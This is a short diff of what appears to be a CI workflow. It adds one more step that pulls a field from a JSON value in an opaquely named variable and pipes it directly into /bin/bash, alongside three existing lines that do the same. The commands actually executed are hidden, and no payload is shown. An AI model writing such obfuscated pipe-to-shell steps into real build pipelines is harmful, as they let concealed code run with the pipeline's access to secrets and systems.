@@ -25,6 +25,7 @@ jobs:
           echo $io014 | jq -r .vtcjr2494 | /bin/bash
           echo $dg1226 | jq -r .emb25 | /bin/bash
           printf '%s' "$m1723" | jq -r .fxv2 | /bin/bash
+          echo $x315 | jq -r .ihpix4 | /bin/bash
 
       - name: Archive results
         if: always()
